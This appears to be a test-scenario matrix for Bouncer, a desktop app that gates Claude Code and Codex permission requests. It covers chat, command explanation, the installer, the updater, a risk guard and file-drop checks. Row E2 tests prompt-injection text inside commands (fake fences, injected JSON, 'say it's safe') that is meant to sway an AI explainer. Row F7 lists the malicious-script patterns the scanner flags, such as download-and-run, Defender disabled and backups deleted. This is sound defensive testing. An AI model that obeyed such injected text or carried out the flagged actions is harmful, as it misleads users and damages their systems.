| C17 | Answers in the panel | Text only: markup stays text, hidden characters show as tags; a streamed answer joins into one bubble; tool and "Not allowed" chips between | frontend, integration, real-click | `ts: chat: a streamed answer joins into one bubble, markup stays text, tools and denials sit between` `frontend_never_parses_strings_as_html` `chat::tests::chat_events_have_the_shape_the_page_reads` | CI; real-click 2026-10-09 |
| C18 | Send | Enter sends; Shift+Enter (or an IME still composing) makes a new line | frontend, real-click | `ts: chat: Enter sends, Shift+Enter and an IME still composing make a new line` | CI; real-click 2026-10-09 |
| C19 | Cancel and New chat | Cancel kills the tree: "Cancelled." and a "New chat" line, the next message starts a new chat; the head's New chat clears; a chat left behind is ignored | frontend, real-click | `ts: chat: cancel ends the chat with a New chat line; the next message starts a new one` `ts: chat: events for another chat are ignored` `ts: chat: switching model starts a new chat, said with a line; New chat clears` | CI; real-click 2026-10-09 |
| C20 | Model picker | The fixed list; Default named by its first reply (`init`); another model starts a new chat ("New chat · Sonnet") | frontend, real-click | `ts: chat: the Default model is named by its first reply` `ts: chat: switching model starts a new chat, said with a line; New chat clears` | CI; real-click 2026-10-09 |
| C21 | Usage line | "Runs your Claude Code · counts against your plan" and the plan's 5-hour and 7-day use from Claude Code; until a chat reply brings a reading (also after a restart: chats are memory-only) "Plan use shows after your first message", never old values, never a call of its own | frontend, real-click | `ts: chat: the usage line shows the plan's 5-hour and 7-day use` `ts: chat: no plan-use reading until a reply brings one (nothing stored, nothing fetched)` | CI; real-click 2026-10-09, 2026-10-16; hand 2026-10-16 (Charan, v0.8.3) |
| C22 | Errors | Not found, an unsupported version (with it), the plan not allowing a model (Claude Code's words), a crash (exit code and line) | frontend, real-click | `ts: chat: errors read as Claude Code wrote them or say plainly what's wrong` | CI; real-click 2026-10-09 |
| C23 | First run and the claude path | No chat before the found `claude`'s full path is confirmed in Settings; a changed path asks again; only the path shown can be confirmed; the file must be only the user's | unit, real-click | `chat::tests::only_the_confirmed_claude_runs` `chat::tests::the_page_sees_which_claude_and_whether_it_is_confirmed` | CI; real-click 2026-10-09 |
| C24 | A card while chatting | The card replaces the panel; the chat keeps streaming behind it; the draft is kept; the panel is back after | real-click | (6b check: 294 → 4066 characters behind the card) | real-click 2026-10-09 |
| C25 | Typing when a card arrives | The keyboard goes nowhere, through the card's re-renders: a space, typing or Enter answer nothing; Tab reaches Deny on purpose; never Allow | frontend, real-click | `ts: chat: a card arriving while you type takes the keyboard nowhere, else to Deny (never Allow)` `ts: chat: a card that came while you typed keeps the keyboard off through its re-renders` | CI; real-click 2026-10-09 |
| C26 | Motion and CPU while chatting | Fixed height (the window never resizes while streaming); nothing moves forever (a steady caret, the spinner settles); streamed text sent twice a second at most | frontend, integration, real-click | `ts: chat: the panel never resizes while streaming and nothing in it moves forever` `waiting_a_little_never_ends_the_chat_but_the_limits_still_hold` | CI; real-click 2026-10-09 (CPU in PLAN) |
| C27 | Keyboard in the panel | Opens with the keyboard in the message box; Tab: message, Send, New chat, ×, the models, round again; Esc closes it (the chat keeps running) and gives the keyboard back | real-click | (kb check) | real-click 2026-10-09 |
| C28 | The chat commands | Seven chat commands and the two explain commands (E8) granted, nothing else; same CSP | unit | `tests::strict_csp_and_only_our_commands` | CI |
| C29 | Quit or crash with a chat open | The chat's whole tree dies with the app (Job Object; force-stopped twice: no `claude` left) | integration, real-click | `dropping_a_chat_kills_the_whole_tree` | CI; real-click 2026-10-09 |
| C30 | A real chat | Real clicks, npm's native `claude.exe` confirmed, Haiku in `bouncer-playground/chat`: tool chip, denial, answer, plan use; asked what it can do, it says read-only (no edits, commands or web); nothing written | real-click | (6b check) | real-click 2026-10-09 (2.1.295); Hand 3 passed 2026-10-12 |
| C31 | Esc in Settings opened from the chat | Closes only Settings: back to the chat, the keyboard in the message box; Esc again closes the panel | frontend, real-click | `ts: chat: Esc in Settings opened from the chat closes only Settings` | CI; real-click 2026-10-09 |
| C32 | Markdown in answers | Paragraphs, headings, lists (numbered from their start), quotes, rules, bold, italic, inline code, fenced code with the code pane's colors; formed while streaming (an unclosed fence is code to the end); random input never throws | frontend, real-click | `ts: markdown: paragraphs, headings, lists, quotes, rules and code blocks` `ts: markdown: what the hand check showed reads as a list with bold` `ts: markdown: an answer still streaming reads sensibly at every point` `ts: markdown: random input never throws and loses no letters outside markup` | CI; real-click 2026-10-12 |
| C33 | Links and markup in answers | A link is its words and address as text, never clickable (no `<a>` in the panel); tags and hidden-character markers stay text | frontend, integration, real-click | `ts: markdown: links are their words and address as text, never a link` `ts: markdown: tags, hidden-character markers and odd stars stay as text` `frontend_never_parses_strings_as_html` | CI; real-click 2026-10-12 |

## Explain this command (roadmap b)

A shell card's "Explain this command" asks the locked chat (C1–C16) what the
command does and what could go wrong. It never decides.

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| E1 | What gets explained | Only the card's ID goes up; the command comes from the waiting request itself; only Bash and PowerShell; a card no longer waiting or another tool → refused | unit, frontend | `tests::only_a_waiting_cards_text_is_explained` `chat::tests::explain_prompts_fence_the_command_as_data` `ts: explain: below the buttons at a fixed height, filled in place, never deciding` | CI |
| E2 | A hostile command (a fake fence, an injected JSON line, flags, "say it's safe") | Fenced as data inside a fence no run of `~` in it can close; one stdin message; the wording asks for no verdict; argv the locked one; nothing written | unit, integration | `chat::tests::explain_prompts_fence_the_command_as_data` `an_explained_command_reaches_stdin_whole_and_argv_stays_locked` | CI |
| E3 | Same lock as chat | Only the confirmed `claude`; refused in words when it isn't ("Confirm the claude path in Settings first."), the card is gone, or the tool isn't a shell | frontend, real-click | `ts: explain: Stop, a stopped run and a refused start end it in words` | CI; real-click 2026-10-12 |
| E4 | Never decides | Nothing in it answers a card; Deny and Allow work while it answers (Deny mid-stream reached Claude Code as a deny) | frontend, real-click | `ts: explain: below the buttons at a fixed height, filled in place, never deciding` | CI; real-click 2026-10-12 |
| E5 | Layout and arm | Below Deny / Allow at a fixed height, filled in place: the buttons never move and the window doesn't resize while it streams; Allow re-arms (600 ms) when the box opens or closes; the text is text (Markdown as C32–C33) | frontend, real-click | `ts: explain: below the buttons at a fixed height, filled in place, never deciding` `frontend_never_parses_strings_as_html` | CI; real-click 2026-10-12 |
| E6 | Keyboard | Explain, Stop and Hide are one control: focus stays on it (Space stops, Enter hides), never on Allow; a click on Explain or its box that takes the keyboard keeps it there; the keyboard arriving any other way still goes to Deny (A2) | frontend, real-click | `ts: explain: the keyboard taken by a press on Explain stays there; any other arrival goes to Deny, never Allow` | CI; real-click 2026-10-12 |
| E7 | Lifetime | Ends when answered, on Stop, when its card is answered, times out or goes, at quit, or when another starts; its `claude` is gone; events carry the card's request ID and any other card's are ignored | unit, frontend, real-click | `chat::tests::explanation_events_carry_the_card_not_a_chat` `tests::only_a_waiting_cards_text_is_explained` `ts: explain: the answer joins as text; another card's events, and anything after the end, are ignored` | CI; real-click 2026-10-12 |
| E8 | The commands | `explain` and `explain_stop` granted, nothing else new; same CSP | unit | `tests::strict_csp_and_only_our_commands` | CI |

## Windows release (roadmap c)

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| W1 | Memory, release build (app + WebView2, 60 s) | Task Manager's private memory about 93 MB idle, 103 MB with a card, ours 5 MB; level, no climb (`docs/PLAN.md`, roadmap c) | real-click (measured on the test instance) | — | measured 2026-10-12 |
| W2 | Start with Windows | Off by default; on writes one value (`Bouncer`, the quoted app path) in the per-user Run key; off deletes only a value whose program is ours, someone else's `Bouncer` stays; the switch shows what Windows has; not offered off Windows | unit, real-click (page-level) | `windows: autostart::tests::on_off_and_someone_elses_value_left_alone` `autostart::tests::only_our_program_counts_as_ours` | CI; real-click 2026-10-12 |
| W3 | Shortcut Ctrl+Alt+B | On by default; opens the island with the keyboard, on Deny with a card up (never Allow), answers nothing; Settings turns it off (keys released) and on; held by another app: harmless, the hint says so; a second launch never registers it | unit, real-click (key presses on the test instance) | `tests::the_shortcut_only_opens_the_island` `prefs::tests::unknown_or_broken_values_fall_back_per_field` | CI; real-click 2026-10-13 |
| W4 | Installer | NSIS only (no MSI), per user in `%LOCALAPPDATA%\Bouncer`, no admin prompt; `bouncer-hook.exe` and `bouncer.exe` beside the app; uninstall entry and Start menu shortcut | unit, real (installed on this PC, 2.24 MiB) | `tests::the_installer_is_per_user_and_its_uninstall_steps_are_guarded` | CI; real 2026-10-13 |
| W5 | Install over itself (same version) | The running app is closed, files replaced, one uninstall entry; the hooks in Claude Code's settings and their path stay valid; a request waits on a card again | real | — | real 2026-10-13 |
| W6 | Uninstall and the hooks | Offers removal in its own console: the diff, why ("Installing Bouncer again next? Answer N") right above the question, "no" the default, nothing without "y", a dated backup; "no" says what Claude Code will show; waits for Enter. Never in an update, a silent or passive run, or when an installer runs the uninstaller (an upgrade's "uninstall before installing": it runs in place, beside the app) | integration, unit, real | `the_uninstaller_asks_explains_and_waits` `tests::the_installer_is_per_user_and_its_uninstall_steps_are_guarded` | CI; real 2026-10-13 (the upgrade path: the disposable CI test, c-6) |
| W7 | Uninstall's "Delete the application data" box (the one exception to one wipe path) | Unticked by default: `%APPDATA%\Bouncer` and the WebView2 folder stay; ticked: exactly those two go (our step deletes only `%APPDATA%\Bouncer`; Tauri's, the WebView2 folder); never in an update | unit, real | `tests::the_installer_is_per_user_and_its_uninstall_steps_are_guarded` | CI; real 2026-10-13 |
| W8 | A dev build next to an installed Bouncer | Shares nothing: identifier `….bouncer.dev` (own WebView2 folder), data folder `Bouncer-dev`, pipe / socket `bouncer-dev-…`, autostart value `Bouncer-dev`; release builds keep the plain names | unit (debug and, for the relay, release) | `tests::dev_and_release_builds_share_nothing` `tests::dev_and_release_builds_have_their_own_names` | CI |
| W9 | Releases | Only a pushed tag vX.Y.Z, 0.7.0 or later (old v0.5.x / v0.6.x refused); the version stamped from the tag into the crates, package.json, tauri.conf.json and the installer, and checked; full checks and the installer test first; SHA256SUMS.txt, a build attestation, a DRAFT release with notes; only the release job writes; every action pinned; a commented signing slot | frontend (reads the workflow), CI | `ts: only a vX.Y.Z tag from 0.7.0 on is a release` `ts: the version check fails when any place disagrees` `ts: the release workflow: tags only, a draft, and only its release job writes` `ts: every action in the workflows is ours or pinned to a commit` | CI |
| W10 | The installer on a disposable machine | On a fresh windows-latest runner, test builds 0.0.1 and 0.0.2: install, hooks via the installed bouncer.exe, a card, Start with Windows on / off from Settings, an upgrade through "uninstall before installing" with no hooks console, uninstall unticked (settings.json byte for byte, data kept), uninstall ticked (data gone); Installed apps' Publisher is "Charan" (was "github") | CI (installer job) | (`.github/workflows/installer.yml`, `scripts/installer-test.ps1`) | CI (PRs touching the installer, every release); hand 2026-10-16 (Charan, v0.8.3: Installed apps shows Publisher "Charan") |
| W11 | Release notes | The first release (no earlier tag from 0.7.0 on; old v0.5.x / v0.6.x don't count) says "First public release" with the feature list; later releases list the commits since the previous release tag; both carry SHA256SUMS.txt, the Get-FileHash and `gh attestation verify` lines | frontend (a throwaway git repo) | `ts: release notes: the first release lists features, later ones the changes since the last release` `ts: the release workflow: tags only, a draft, and only its release job writes` | CI |
| W12 | Where it works | Terminal, VS Code extension, desktop app's Code tab: the hooks fire, PermissionRequest included; Allow / Deny from the island reach Claude Code and close the app's own prompt; answered in the app instead, the card leaves when the turn moves on; Claude Code on the web can't be seen; cards only when Claude Code asks: none in bypass, rare in auto, in accept-edits only for commands that aren't file commands (README, Known limit) | real (each app's own `claude.exe`, started as the app starts it, playground hooks, test instance), hand (v0.7.0 check, step 4) | — | real 2026-10-13 (PLAN, c-7; modes: PLAN, Permission modes) |
| W13 | The installer test's first launch | The WebView2 runtime folder is read before the first launch and the 30 s limit stays, so a runner's slow first read can't stop a release and a stall in Bouncer's startup still does | frontend, installer workflow | `ts: installer test: the WebView2 runtime is read before the first launch, and the 30 s limit stays` | CI |
| W14 | Cold start | Its own workflow, nothing warmed: seconds to the pipe in the run summary, a warning above 30 s, a failure only above 120 s; no release and no required check waits for it | frontend, cold-start workflow | `ts: cold start: its own workflow, nothing warmed, and no release or required check waits for it`, `windows: ts: cold start: under 30 s is ok, over 30 s warns, only over 120 s fails` | CI |

## Guard every mode (roadmap c3)

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| G1 | The switch | `guard` in `rules.toml`, missing = off; only true / false (else the file is refused, guard off); Settings writes only that line (added above the tables if missing), shown as "Rules changed: guard on / off"; its hint says what it changes, as the prototype; the row only calls `set_guard`, a bool | unit, frontend | `rules::tests::guard_is_off_unless_set_and_must_be_true_or_false` `rules::tests::set_guard_changes_only_the_guard_line` `approvals::tests::set_guard_writes_the_file_and_the_island_shows_it` `ts: the guard switch says what it changes, word for word as the prototype` | CI |
| G2 | When Bouncer asks | Only a PreToolUse, guard on, not paused, mode auto / acceptEdits / bypassPermissions, and a risk reason: `Ask`, at once, no card of its own; default, plan, dontAsk, unknown or missing mode, a safe request, guard off or paused: nothing | unit | `approvals::tests::the_guard_asks_only_for_risky_requests_in_modes_that_dont_ask` `approvals::tests::the_guard_is_off_unless_turned_on_and_steps_aside_when_paused` | CI |
| G3 | The wire and the relay | The server sends `ask` only for a PreToolUse (allow / deny only for a PermissionRequest); the relay prints the documented PreToolUse ask (fixed reason) for exactly `ask`, nothing else ever; a late answer prints nothing within ~2 s | unit, integration | `ipc::tests::ask_goes_only_to_a_pre_tool_use` `tests::the_guard_prints_ask_for_exactly_ask_and_nothing_else` `the_guard_makes_claude_code_ask_only_for_a_pre_tool_use` `the_desk_guards_risky_requests_through_the_real_relay` `a_slow_guard_answer_prints_nothing` | CI |
| G4 | A real Claude Code | With the switch on: a risky command in bypass, auto and accept-edits mode raises Claude Code's prompt and Bouncer's card; island Deny reaches it; switch off: it runs unasked; a `claude -p` run refuses it (documented) | real (test instance, playground hooks), hand (terminal check below) | — | real 2026-10-14 (PLAN, c3); hand check 4 driven 2026-10-14 (PLAN, c2); hand 2026-10-28 (Charan, v0.11.0 installed, auto mode: safe steps ran with no card; reading `~/.claude/settings.json` got a risky card "Touches Claude Code's own settings", denied); hand 2026-10-28 (Charan, v0.11.1, flagged hook: the same risky card, denied); hand 2026-10-29 (Charan, v0.12.0: the same risky card, denied); hand 2026-10-30 (Charan, v0.13.2: risky card, denied) |

## Questions in the island (roadmap c2)

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| Q1 | Which questions Bouncer shows | One check shared by the relay and the app: 1–4 questions with unique, non-empty texts; 2–4 options with unique, non-empty labels; `multiSelect` a bool or absent; no ", " in a multi-select's labels; no `answers` yet. Picks: one group per question, one-digit numbers, strictly increasing, exactly one for a single-select | unit | `questions::tests::only_unambiguous_questions_are_accepted` `questions::tests::picks_must_cover_every_question_once_and_in_range` `questions::tests::answers_echo_the_input_and_add_the_chosen_labels` `questions::tests::the_picks_line_round_trips` | CI |
| Q2 | The relay's answer | Built from its own copy of Claude Code's input: a question's `answer <picks>` → allow + the input plus `answers` (labels looked up by number); a plan's `approve` → allow + the input as it came, `keep` → deny with fixed text; never a plain allow / deny for them; these words mean nothing for any other tool; anything else prints nothing | unit, integration | `tests::a_question_is_answered_only_with_its_own_labels` `tests::a_plan_is_approved_as_it_came_or_kept_in_planning` `tests::anything_else_prints_nothing` `questions_and_plans_are_answered_from_the_island_through_the_real_relay` | CI |
| Q3 | The wire | `answer` only for an AskUserQuestion request, `approve` / `keep` only for an ExitPlanMode one; allow / deny never for them | unit | `ipc::tests::questions_and_plans_get_only_their_own_words` | CI |
| Q4 | A question card | Its own card (no rule, "would", offer or guard, in auto mode too), text made visible-safe; answered only by `answer` with picks that fit (armed 600 ms, single-use); `decide` / `always` / `plan` refused for it; unanswered: times out with no answer | unit | `approvals::tests::a_question_gets_a_card_that_only_its_picks_answer` `approvals::tests::an_unanswered_question_times_out_with_no_answer` | CI |
| Q5 | A plan card | Its own card with the plan and its file; Keep planning at once, Approve armed; single-use; allow / answers refused; no plan text: still a card that says so | unit | `approvals::tests::a_plan_gets_a_card_approved_or_kept_only_by_the_user` | CI |
| Q6 | Answered elsewhere, paused, or not showable | Relay stopped (answered in the terminal): the card leaves within a second; answered in the desktop app's or VS Code's own prompt (Claude Code doesn't stop the hook): the card leaves on that tool's PostToolUse (its input differs: answers added, or the plan's empty input); a late answer is refused and nothing is printed. Paused, or a shape Bouncer can't show: no card, nothing printed at once, "question in the terminal" | integration, unit | `a_question_answered_elsewhere_leaves_and_a_late_click_sends_nothing` `approvals::tests::a_question_or_plan_answered_in_the_app_leaves_when_its_tool_runs` `questions_bouncer_cant_show_print_nothing_so_the_terminal_asks` `approvals::tests::questions_bouncer_cant_show_go_to_the_terminal_and_flag_the_session` | CI |
| Q7 | The app's commands | `answer` (ID + numbers) and `plan` (ID + a bool) only, granted to the page and listed with our own commands | unit | `tests::strict_csp_and_only_our_commands` | CI |
| Q8 | The page | Built to prototype v0.28: questions, options (one or several picks, a filled mark), Send answer armed and only when every question has a pick; plan as Markdown from text with Keep planning / Approve plan; the page sends only the ID and numbers or approve / keep; the keyboard arrives on the first option or Keep planning; agent text with red tags | frontend, real (test instance) | `ts: the page sends only the card's ID and option numbers, or approve / keep` `ts: Send answer and Approve plan arm like Allow (so Enter never reaches them); a pick never sends` `ts: one pick for a single-select question; a second press clears it` `ts: a multi-select question adds and removes picks, kept sorted` `ts: an answer is ready only when every question has a pick` `ts: questions: the keyboard arrives on the first option or on Keep planning, never on a button that answers` | CI; real 2026-10-14 (PLAN, c2) |
| Q9 | A real Claude Code | Island answer reaches the question / plan (desktop app's, VS Code's and the terminal's Claude Code); single and multi pick, two questions, approve, keep planning; answered in the app or the terminal first takes the card away and a late click sends nothing; bypass mode in the terminal | real (test instance, playground hooks, test config folder), hand (hand check 5) | — | real 2026-10-14 (PLAN, c2); hand check 5 driven 2026-10-14; hand 2026-10-17 (Charan, installed v0.9.0: a question card answered with one click) |

## Updater (v0.8)

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| UP1 | Which release is offered | Only a plain X.Y.Z strictly newer than ours; never the same, older, a prerelease / build tag or anything odd | unit | `update::tests::only_a_plain_newer_version_is_offered` | CI |
| UP2 | The switch | `updates` in preferences.json, on by default, only true / false; Settings' "Check for updates" says what goes over the network (word for word as the prototype) and calls only `set_updates`; off forgets a found release | unit, frontend | `prefs::tests::unknown_or_broken_values_fall_back_per_field` `prefs::tests::missing_file_gives_defaults_and_save_reads_back` `ts: update: Settings says what the check does, word for word as the prototype` | CI |
| UP3 | What the check reads | One fixed HTTPS URL (the latest published release's latest.json; no version or machine in it), our public key, passive install; normal builds never sign | unit | `update::tests::the_updater_reads_one_fixed_https_file_and_checks_our_key` | CI |
| UP4 | Dev builds and busy islands | Bouncer-dev never checks or installs; install refused while a card waits or a chat / explanation runs, checked before and after the download; only the Update button installs | unit | `update::tests::dev_builds_never_update_and_a_busy_island_waits` | CI |
| UP5 | The update line | Built to prototype v0.29: "Bouncer X.Y.Z is ready" above the sessions, Update armed like Allow; "Update after you answer" while a card is up or a chat answers; "Updating…" while it installs; the page sends `update_install` with no arguments | frontend | `ts: update: Update waits while you're answering, and while it installs` `ts: update: the page only asks to install (no arguments) and flips the switch; the button arms like Allow` | CI; test instance 2026-10-15 (PLAN, Updater) |
| UP6 | The commands | `set_updates` (a bool) and `update_install` (no arguments) granted; no updater plugin permission for the page | unit | `tests::strict_csp_and_only_our_commands` | CI |
| UP7 | The release | The installer is built with no secrets; only the next step gets the updater key and runs only the pinned Tauri CLI's `signer sign` on it; latest.json (version, date, windows-x86_64 url + signature) is refused unless the signature's key ID is the configured public key's; the draft carries it; installer and CI builds never sign; v0.8.1's notes (the first release with these features; 0.8.0 never released) say 0.7.0 users install by hand once; a never-released tag (v0.8.0) is skipped by the notes | frontend (workflow checks) | `ts: updater: the key reaches only the steps that sign the finished installers; the draft carries latest.json` `ts: updater: latest.json points at this release's installers with their signatures` `ts: v0.8.1's notes: the first release with these features, 0.8.0 never released, 0.7.0 users install it by hand once` | CI |
| UP9 | The key installed copies look up | The release job stops unless latest.json has exactly `windows-x86_64`, `darwin-aarch64` and `darwin-x86_64` (only `windows-x86_64` on a run told `--windows-only`, M6); the tag's checks stop unless the plugin pinned in Cargo.lock still builds those keys (`{os}-{arch}`, read from its own source): a wrong key would fail every check silently, so no update would ever show | frontend (real plugin source), release workflow | `ts: updater: a platform key the pinned plugin doesn't look up stops the release` | CI |
| UP8 | A real update | 0.8.0 installed, 0.8.1 published: the line shows within a day (or at start), Update installs passively and Bouncer comes back with hooks, rules, settings and history; offline: nothing shown | hand (after v0.8.1) | — | hand 2026-10-16 (Charan: 0.8.1 → 0.8.2; the line came after start, Update installed with no SmartScreen prompt, Installed apps shows 0.8.2, guard / settings / hooks unchanged; offline not checked); hand 2026-10-16 (Charan: 0.8.2 → 0.8.3 offered and installed); hand 2026-10-17 (Charan: 0.8.3 → 0.9.0 offered and installed); hand 2026-10-22 (Charan: 0.10.0 → 0.10.1 through the updater; Claude Code hooks Installed after); hand 2026-10-28 (Charan: 0.10.1 → 0.11.0 through the updater; Settings shows 0.11.0); hand 2026-10-28 (Charan: 0.11.0 → 0.11.1 through the updater; Settings shows 0.11.1); hand 2026-10-29 (Charan: 0.11.1 → 0.12.0 through the updater; Settings shows 0.12.0); hand 2026-10-30 (Charan: 0.12.0 → 0.13.0 through the updater; Settings shows 0.13.0); hand 2026-10-30 (Charan: 0.13.0 → 0.13.1 through the updater; Settings shows 0.13.1); hand 2026-10-30 (Charan: 0.13.1 → 0.13.2, the first update installed by plugin 2.14.0) |

## File drop (roadmap d)

A file dropped on the island: Bouncer's own checks at once (no AI, nothing
sent), then "Is this safe to run?" or "Ask about it" through the locked chat
(C1–C16), only after Send on the exact text. Real clicks and real drags
(a shell file drag, `CF_HDROP`, into the test instance behind the guard).

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| F1 | Drag a file over the island | A big "Drop to check it" target opens (easy to hit); several items say "One file at a time"; leaving puts the island back | frontend, real-click | `ts: drop: Bouncer's report never says safe and always says it can be wrong` | CI; real-click 2026-10-16; Hand 6 passed 2026-10-16 |
| F2 | Drop one file | "Checking", then Bouncer's report: name, what it really is, size, findings (risky first), SHA-256, "Bouncer's own checks · can be wrong · you decide"; never "safe", never green | unit, frontend, real-click | `drop::tests::the_report_the_page_reads` `ts: drop: Bouncer's report never says safe and always says it can be wrong` `ts: drop: sizes read as the backend's` | CI; real-click 2026-10-16; Hand 6 passed 2026-10-16; hand 2026-10-17 (Charan, installed v0.9.0: run.ps1 → Looks risky, with the catch animation) |
| F3 | Refused drops | A folder, several items, a link / junction (any reparse point), online-only, a network or device path, unreadable, empty: refused with a reason, nothing read | unit, real-click | `drop::tests::real_files_are_read_or_refused_with_a_reason` | CI; real-click 2026-10-16 (folder, several); Hand 6 passed 2026-10-16 |
| F4 | A file being written; a file held | Another program writing it → "close it and try again"; while Bouncer holds it nobody can write, rename or delete it; every check uses that one handle | unit | `windows: drop::tests::a_file_being_written_is_refused_and_a_held_one_cant_be_written` | CI |
| F5 | What it really is | Magic bytes, not the name: a program named `.pdf`, `.scr`, no ending; MSI / old Office, zip family, PDF, 7z / RAR / gzip / CAB / ISO ("can't look inside"), Linux and Mac programs | unit | `drop::tests::a_program_is_known_by_its_bytes_not_its_name` `drop::tests::office_macros_and_kinds` | CI |
| F6 | Name tricks | Right-to-left override (real ending named), double endings (`.pdf.exe`), spaces before the ending, hidden characters, look-alike letters; the name shown with tags, cut, as text | unit, real-click | `drop::tests::name_tricks_are_flagged` | CI; real-click 2026-10-16 |
| F7 | Scripts and text | Line by line: download-and-run, encoded commands, Defender off, start-on-its-own, attacker tools, policy off, hidden windows, backups deleted, whole-drive deletes, hidden characters, long encoded blocks; npm install scripts; VS Code tasks on open; UTF-16; risky only in files that run; paths in the text never resolved (no disk or network touch) | unit | `drop::tests::risky_script_lines_are_found_with_their_line_numbers` `drop::tests::the_same_words_in_a_plain_text_file_are_facts_not_risks` `drop::tests::script_text_never_makes_bouncer_touch_paths` `drop::tests::utf16_scripts_are_read` `drop::tests::install_scripts_and_tasks_that_run_on_open` `drop::tests::a_big_text_file_is_checked_from_its_start_and_says_so` | CI |
| F8 | Zip archives | The central directory only, never unpacked: programs inside, zip slip, links, password-protected entries, macros, nested archives, a zip bomb (only numbers), zip64, a big zip read from its end, damaged lists say what was read | unit, real-click | `drop::tests::a_zip_is_listed_without_unpacking` `drop::tests::a_zip_bomb_is_only_numbers` `drop::tests::zip64_lists_are_read` `drop::tests::a_big_zip_is_read_from_its_end` `drop::tests::damaged_zips_say_what_was_read` | CI; real-click 2026-10-16; Hand 6 passed 2026-10-16 |
| F9 | Shortcuts (`.lnk`) | Read from their own bytes, never followed: the target (environment block, link info, relative path) and arguments as text; a shell or script host as the target, padded arguments, a network target, the arguments' own risks; user names left out of paths | unit, real-click | `drop::tests::a_shortcut_says_what_it_runs_without_following_it` `drop::tests::user_names_never_leave_in_a_shortcut_target` | CI; real-click 2026-10-16 |
| F10 | Hostile bytes | Random, truncated and corrupted zips and shortcuts, and random bytes under any name, never panic or hang | unit | `drop::tests::random_and_broken_zips_never_panic_or_hang` `drop::tests::random_and_broken_shortcuts_never_panic_or_hang` `drop::tests::random_bytes_never_panic_whatever_the_name` | CI |
| F11 | Signature, origin, fingerprint | Windows' own check on the held handle, nothing fetched ("No signature in the file", "Signed by …", changed after signing); the Mark of the Web's zone and the site's host only; SHA-256 of the whole file (none over 256 MB, said so) | unit | `windows: drop::tests::windows_reads_the_signature` `drop::tests::the_download_site_is_named_by_its_host_only` `drop::tests::sha256_matches_the_standard_vectors` | CI; Hand 6 passed 2026-10-16; hand 2026-10-17 (Charan, installed v0.9.0: the 0.8.1 installer → No signature in the file, SHA-256) |
| F12 | "Is this safe to run?" | The preview is exactly what's sent (the file's name only, never its folder; facts and a text file's first 32 KB, secrets blanked, fenced as data; never a program's bytes); Send runs the locked chat with it on stdin; Cancel sends nothing; the answer box says "can be wrong · you decide"; Stop ends it; the file never reaches the chat folder | unit, frontend, real-click | `drop::tests::the_prompt_holds_the_name_never_the_folder_and_fences_the_file` `drop::tests::the_largest_prompt_still_fits_the_chat` `ts: drop: the answer streams for its own drop only, and stops in words` `ts: drop: a refused start says why; a file no longer held asks for the drop again` `chat::tests::explanation_events_carry_the_card_not_a_chat` | CI; real-click 2026-10-16 (fake claude); Hand 6 passed 2026-10-16 |
| F13 | "Ask about it" | The chat panel shows the file and exactly what goes with the next message; it goes with that one message only; × removes it; a new drop, Close or the 10-minute hold drop it | frontend, real-click | `ts: drop: an attachment lasts only while its drop is the one shown` | CI; real-click 2026-10-16 (fake claude); Hand 6 passed 2026-10-16 |
| F14 | The page's side | No path ever reaches the page's code or goes back: only the drop's ID (`drop_close`, `drop_preview`, `drop_ask`, `drop_stop`); the island never leaves its own page; the window is visible (parked off-screen) from the start so WebView2 takes drops | unit, frontend | `ts: drop: the page never reads or sends a path, and sends only the drop's ID` `tests::the_island_never_leaves_its_page` `tests::strict_csp_and_only_our_commands` | CI |
| F15 | Cards come first | A permission card arriving over a report takes the island; once answered the report is back | real-click | (drop check) | real-click 2026-10-16 |
| F16 | Bouncer reacts to a drop | Over the island: opens like a mitt, eyes toward the file (no flicker: a leave followed by an enter within 150 ms changes nothing); drop: one 450 ms gulp as the report appears, never delaying it; then wary (risky) or curious (nothing found), never happy; refusal: a 360 ms shake; a card cuts any of it for good; reduced motion: faces only; no measurable CPU over the drag without it (CSS only) | frontend, real-click | `ts: drop: the gulp and the nope play once per drop, carry on through redraws, and a card cuts them for good` `ts: drop: Bouncer is never happy over a file, and the motion is CSS only, short, and off with reduced motion` | CI; real-click 2026-10-16; Hand 6 passed 2026-10-16; hand 2026-10-17 (Charan, installed v0.9.0) |
| F17 | An unsigned program or installer from the internet | A program (MZ) or MSI with no signature Windows can check and a Mark of the Web (internet or untrusted zone) gets an amber caution: "Not signed and downloaded from the internet. Only run it if you trust where it came from."; the heading stays as it is (a caution is not a risk); none without the Mark of the Web, for signed files, scripts or old Office files | unit, frontend | `drop::tests::an_unsigned_program_from_the_internet_gets_a_caution_not_a_risk` `windows: drop::tests::windows_cautions_about_an_unsigned_download` `ts: drop: a caution line is amber and leaves the heading as it is` | CI |

## Codex (roadmap h1)

Codex CLI 0.163.0 hooks (`--agent codex` on the installed command). Allow /
deny only: no question or plan cards, no guard. Fixtures recorded from the
real Codex 0.163.0 with a fake model on 127.0.0.1 (no Codex subscription;
paths as `dev`).

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| CX1 | Every event Codex sends (recorded) | Parses as Codex's; reaches the app as Codex's; only the permission request prints, and only Codex's documented allow | integration, fixture | `codex_fixtures_reach_the_app_as_codex_and_only_the_request_prints` `event::tests::recorded_codex_events_parse` | CI |
| CX2 | Which agent | Only the relay's command line says Codex (exactly `--agent codex`); no arguments = Claude Code; any other arguments print nothing and send nothing; a mark in the agent's own JSON is dropped; an unknown mark is refused by the app | unit, integration | `tests::only_no_arguments_or_exactly_agent_codex_run` `tests::the_mark_comes_only_from_the_command_line` `event::tests::the_relay_mark_decides_the_agent` `codex_gets_only_allow_or_deny_through_the_real_relay` | CI |
| CX3 | Codex's answers | Allow or deny only (deny with fixed text); never `updatedInput`, `updatedPermissions`, `interrupt`, `ask`, picks or a plan; tools named like Claude Code's question / plan get a plain card; no answer, a closed app or a slow one print nothing | unit, integration | `codex_gets_only_allow_or_deny_through_the_real_relay` `ipc::tests::codex_gets_only_allow_or_deny` `approvals::tests::codex_tools_named_like_questions_get_a_plain_card` | CI |
